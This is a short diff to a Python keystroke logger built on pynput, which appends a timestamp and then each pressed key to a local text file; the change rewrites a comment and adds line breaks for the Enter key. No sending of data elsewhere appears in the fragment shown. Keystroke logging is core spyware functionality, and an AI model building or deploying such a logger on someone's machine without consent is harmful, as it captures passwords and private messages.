@@ -1,7 +1,7 @@
 from pynput import keyboard
 import datetime
 
-# Empty the file
+# Record the date and time in the file
 with open("./file.txt", "a") as file:
     current_datetime = datetime\
                         .datetime\
@@ -15,6 +15,8 @@ def on_press(key):
             with open("./file.txt", "a") as output_file:
                 if key == keyboard.Key.space:
                     output_file.write(" ")
+                elif key == keyboard.Key.enter:
+                    output_file.write("\n")
                 else:
                     output_file.write(key.char)
         except AttributeError:
